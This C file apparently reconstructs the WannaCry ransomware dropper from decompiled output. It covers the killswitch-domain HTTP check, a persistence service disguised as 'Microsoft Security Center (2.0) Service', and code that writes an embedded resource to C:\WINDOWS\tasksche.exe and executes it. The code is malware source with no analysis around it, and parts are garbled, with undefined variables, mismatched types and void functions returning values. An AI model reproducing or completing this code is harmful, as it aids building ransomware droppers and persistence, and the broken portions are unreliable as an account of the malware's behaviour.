#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <time.h>
#include <windows.h>


void create_wannacry_service() {
  SC_HANDLE hSCManager;
  SC_HANDLE hService;
  char exec_with_args [260];
  
  // C:\Austin\Desktop\wannacry.exe -m security
  sprintf(exec_with_args, "%s -m security", &executable_path);
  hSCManager = OpenSCManagerA(NULL, NULL, 0xf003f);
  if (hSCManager != NULL) {
    hService = CreateServiceA(hSCManager, "mssecsvc2.0", "Microsoft Security Center (2.0) Service", 0xf01ff, 0x10, 2, 1, exec_with_args, NULL, NULL, NULL, NULL, NULL);
    if (hService != NULL) {
      StartServiceA(hService, 0, NULL);
      CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCManager);
    return 0;
  }
  return 0;
}

undefined4 write_1831_to_taskche_exe(void) {
    char cVar1;
    HMODULE hModule;
    HRSRC res1831_info;
    HGLOBAL res1831_handle;
    DWORD res1831_size;
    HANDLE createdFileHandle;
    BOOL BVar2;
    uint uVar4;
    uint uVar5;
    undefined **ppuVar6;
    char *ppCVar7;
    undefined **ppuVar8;
    char *pcVar9;
    char *pcVar10;
    undefined4 *puVar11;
    HANDLE hObject;
    LPVOID res1831_locked;
    _STARTUPINFOA _Stack592;
    char acStack524 [4];
    char taskche_path;
    undefined4 unknown_buffer_nulled [64];
    char qeriu_path;
    undefined4 unknown_buffer2_nulled [64];

    //get handle to kernel32.dll
    hModule = GetModuleHandleW("kernel32.dll");
    if (hModule != NULL) {
        createProcessA = (CreateProcessA *)GetProcAddress(hModule, "CreateProcessA");
        createFileA = (CreateFileA *)GetProcAddress(hModule, "CreateFileA");
        writeFile = (WriteFile *)GetProcAddress(hModule, "WriteFile");
        closeHandle = (CloseHandle *)GetProcAddress(hModule, "CloseHandle");
        
        if ((((createProcessA != NULL) && (createFileA != NULL)) && (writeFile != NULL)) && (closeHandle != NULL)) {
            res1831_info = FindResourceA(NULL,(LPCSTR)1831,"R");
            if (res1831_info != NULL) {
                res1831_handle = LoadResource(NULL,res1831_info);
                if (res1831_handle != NULL) {
                    res1831_locked.hProcess = LockResource(res1831_handle);
                    if (res1831_locked.hProcess != NULL) {
                        res1831_size = SizeofResource(NULL, res1831_info);
                        if (res1831_size != 0) {
                            taskche_path = '\0';
                            puVar11 = &unknown_buffer_nulled;
                            
                            memset(puVar11, 0, 64);
                            
                            *(undefined2 *)puVar11 = 0;
                            *(undefined *)((int)puVar11 + 2) = 0;
                            qeriu_path = '\0';
                            puVar11 = &unknown_buffer2_nulled;

                            memset(puVar11, 0, 64);

                            *(undefined2 *)puVar11 = 0;
                            *(undefined *)((int)puVar11 + 2) = 0;
                            
                            // C:\WINDOWS\taskche.exe
                            sprintf(&taskche_path, "C:\\%s\\%s", "WINDOWS", "tasksche.exe");
                            
                            // C:\Windows\qeriuwjhrf
                            sprintf(&qeriu_path, "C:\\%s\\qeriuwjhrf", "WINDOWS");
                            
                            MoveFileExA(&taskche_path,&qeriu_path, 1);
                            createdFileHandle = (*createFileA)(&taskche_path, 0x40000000, 0, NULL, 2, 4,NULL);
        
                            if (createdFileHandle != (HANDLE)0xffffffff) {
                                (*writeFile)(createdFileHandle, res1831_locked.hProcess, res1831_size, (LPDWORD)&res1831_locked, NULL);
                                (*closeHandle)(createdFileHandle);
                                res1831_locked.hThread = NULL;
                                res1831_locked.dwProcessId = 0;
                                res1831_locked.dwThreadId = 0;
                                ppCVar7 = &_Stack592.lpReserved;
                                
                                memset(ppCVar7, 0, 16);
                               
                                uVar4 = 0xffffffff;
                                ppuVar6 = &PTR_DAT_00431340;
                                
                                strcat(tasksche_path, "/i");
                                
                                uVar5 = uVar4 >> 2;
                                ppuVar6 = (undefined **)((int)ppuVar8 - uVar4);
                                puVar11 = (undefined4 *)(pcVar10 + -1);
                                
                                while (uVar5 != 0) {
                                    uVar5 = uVar5 - 1;
                                    *(undefined **)puVar11 = *ppuVar6;
                                    ppuVar6 = ppuVar6 + 1;
                                    puVar11 = puVar11 + 1;
                                }
                                
                                uVar4 = uVar4 & 3;
                                
                                while (uVar4 != 0) {
                                    uVar4 = uVar4 - 1;
                                    *(undefined *)puVar11 = *(undefined *)ppuVar6;
                                    ppuVar6 = (undefined **)((int)ppuVar6 + 1);
                                    puVar11 = (undefined4 *)((int)puVar11 + 1);
                                }

                                hObject = (HANDLE)0x0;
                                createdFileHandle = (HANDLE)0x0;
                                _Stack592.cb = 0x44;
                                _Stack592.wShowWindow = 0;
                                _Stack592.dwFlags = 0x81;
                                
                                BVar2 = (*createProcessA)(NULL, acStack524, NULL, NULL, 0, 0x8000000, NULL, NULL, (LPSTARTUPINFOA)&_Stack592, (LPPROCESS_INFORMATION)&res1831_locked);
                                
                                if (BVar2 != 0) {
                                    (*closeHandle)(hObject);
                                    (*closeHandle)(createdFileHandle);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return 0;
}

void no_argument_handler(void) {
  create_wannacry_service();
  write_1831_to_taskche_exe();
  return 0;
}

void wannacry_real_entry(void) {
  int *argc;
  SC_HANDLE hSCManager;
  SC_HANDLE hSCObject;
  SERVICE_TABLE_ENTRYA SStack16;
  undefined4 uStack8;
  undefined4 uStack4;
  
  GetModuleFileNameA(NULL, (LPSTR)&executable_path, 0x104);
  argc = (int *)__p___argc();
  
  //if we get less than 1 argument
  if (*argc < 2) {
    no_argument_handler();
    return;
  }

  hSCManager = OpenSCManagerA(NULL,NULL,0xf003f);
  if (hSCManager != NULL) {
    hSCObject = OpenServiceA(hSCManager,"mssecsvc2.0",0xf01ff);
    if (hSCObject != unknown_buffer2_nulled) {
      FUN_00407fa0(hSCObject,0x3c);
      CloseServiceHandle(hSCObject);
    }
    CloseServiceHandle(hSCManager);
  }

  SStack16.lpServiceName = "mssecsvc2.0";
  SStack16.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)&LAB_00408000;
  uStack8 = 0;
  uStack4 = 0;
  StartServiceCtrlDispatcherA(&SStack16);
  
  return;
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
  HINTERNET hInternet;
  HINTERNET hinternet_return;
  char *killswitch_url;
  char *killswitch_url_copy;
  char killswitch_url_buffer [57];
  
  killswitch_url = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";

  killswitch_url_copy = killswitch_url_buffer;
  
  strncpy(killswitch_url_copy, killswitch_url, 57);
  
  *killswitch_url_copy = *killswitch_url;
  InternetOpenA(NULL, 1, NULL, NULL, 0);
  hinternet_return = InternetOpenUrlA(hInternet, killswitch_url_buffer, NULL, 0, 0x84000000, 0);

  //if url request fails
  if (hinternet_return == NULL) {
    InternetCloseHandle(hInternet);
    InternetCloseHandle(0);
    wannacry_real_entry();
    return 0;
  }

  InternetCloseHandle(hInternet);
  InternetCloseHandle(hinternet_return);

  return 0;
}